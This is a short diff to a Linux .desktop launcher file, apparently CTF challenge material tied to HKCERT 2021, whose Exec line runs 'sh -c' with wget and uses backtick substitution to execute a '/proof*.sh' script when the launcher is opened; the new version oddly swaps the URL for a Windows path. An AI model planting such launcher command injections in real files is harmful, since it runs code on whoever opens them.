@@ -1,3 +1,3 @@
 [Desktop Entry]
-Exec=sh -c "wget https://github.com/penguin1824/hkcert2021T0049/blob/main/T0049.desktop?`/proof*.sh`"
+Exec=sh -c "wget C:\Users\user\Desktop\新增資料夾\CTF 2020\Dockerfile?`/proof*.sh`"
 Type=Application
